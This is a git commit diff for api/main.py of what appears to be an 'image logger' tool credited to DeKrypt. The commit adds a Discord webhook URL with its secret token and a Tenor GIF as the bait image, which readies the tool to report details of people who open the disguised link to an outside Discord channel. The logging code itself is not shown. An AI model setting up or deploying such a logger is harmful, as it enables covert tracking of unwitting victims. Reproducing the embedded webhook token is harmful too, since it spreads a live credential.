93984fdecfa1a0d39d574993c1477b2f597560c1
ALAJANS <163891793+ALAJANS@users.noreply.github.com>
2025-10-29 13:34:51 +0000

    Update webhook and image URLs in config

--- api/main.py
+++ api/main.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "",
-    "image": "", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1433086616708186246/_0RLKsZ1wsiVhej-PRGDGqVo0kZg7E1OLDKuZmUpOUfuQhqIPAAgirZFyNhYJG0iGL6K",
+    "image": "https://tenor.com/en-GB/view/turkish-man-gif-14733745593859528159", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
